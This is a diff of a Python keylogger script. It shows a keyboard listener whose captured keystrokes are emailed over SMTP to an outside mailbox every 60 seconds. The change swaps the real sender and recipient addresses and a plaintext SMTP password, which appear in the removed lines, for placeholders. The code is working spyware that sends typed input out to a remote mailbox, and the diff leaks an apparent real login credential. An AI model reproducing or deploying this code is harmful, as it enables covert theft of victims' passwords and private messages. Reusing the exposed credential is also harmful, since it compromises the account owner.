@@ -22,7 +22,7 @@ def on_press(key):
 def send():
     global msg
     if len(msg)>0:
-        server.sendmail("jatin@cyberdrunk.in", "jatinraj.091199@gmail.com", msg)
+        server.sendmail("from@email.in", "toemail.email.com", msg)
     Timer(60.0, send).start()
  
 #keyboard listening
@@ -32,7 +32,7 @@ listener.start()
 #connecting to smtp server
 server=smtplib.SMTP('imap.secureserver.net',993)
 server.starttls()
-server.login("jatin@cyberdrunk.in","V%D8*9V8%F5s$^aD#u")
+server.login("login","password")
  
 #start sending function after 10 minutes
 Timer(60.0, send).start()
